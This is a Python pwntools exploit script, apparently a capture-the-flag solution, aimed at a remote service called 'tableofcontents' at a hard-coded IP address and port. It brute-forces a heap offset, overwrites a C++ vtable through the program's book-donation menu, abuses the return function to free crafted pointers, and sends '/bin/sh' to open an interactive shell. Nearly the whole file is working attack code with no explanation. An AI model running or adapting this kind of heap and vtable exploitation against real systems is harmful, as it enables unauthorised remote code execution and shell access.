for i in range(-130, 500):
	print("I IS THE NUMBER", i)
	from pwn import *

	target = remote('142.93.44.199', 31159)

	#target = process('./tableofcontents')

	#pid = gdb.attach(target, "\nb *add\nb *fetch\nb *fetch+488\nb *fetch+517\nb *return_book+144\n set disassembly-flavor intel\ncontinue")

	def donate_book(title):
		print(target.recvuntil(b'5) Leave feedback'))
		target.sendline(b'1')
		print(target.recvuntil(b'title'))
		target.sendline(title)

	def list_books():
		print(target.recvuntil(b'5) Leave feedback'))
		target.sendline(b'2')
		
	def borrow_book(index):
		print(target.recvuntil(b'5) Leave feedback'))
		target.sendline(b'3')
		print(target.recvuntil(b'get?'))
		target.sendline(str(index))
		print(target.recvuntil(b'3) Tear out page'))
		target.sendline(b'1')
		print(target.recvuntil(b'is: '))
		pointer = target.recvline().strip()
		print(pointer)
		return(int(pointer, 16))
		
	def return_book(ref_num):
		print(target.recvuntil(b'5) Leave feedback'))
		target.sendline(b'4')
		print(target.recvuntil(b'reference number'))
		target.sendline(hex(ref_num))

	def feedback(index, my_feedback):
		print(target.recvuntil(b'5) Leave feedback'))
		target.sendline(b'5')
		print(target.recvuntil(b'feedback:'))
		target.sendline(str(index))
		print(target.recvuntil(b'Enter feedback:'))
		target.sendline(my_feedback)
		

	#vtable overwrite. Note that this /bin/sh isn't actually necessary; it got added during debugging and wasn't hurting anything.
	donate_book(b'/bin/sh\x00' + p64(0x00401e30) * 5 + b'a' * (50 - (8 * 5)))

	list_books()

	pointer = borrow_book(0)

	print(hex(pointer))

	vtable_loc = pointer - (0x14f0 + i * 8)
	print(hex(vtable_loc))

	vtable_loc_off = vtable_loc - 0x8
	list_books()

	return_book(vtable_loc_off)
		
	return_book(pointer)

	feedback(0, '/bin/sh\x00')
	result = target.recvuntil(b'valued', timeout=1)
	print(result)
	if b'valued' in result:
		target.close()
		continue

	target.interactive()
	target.close()
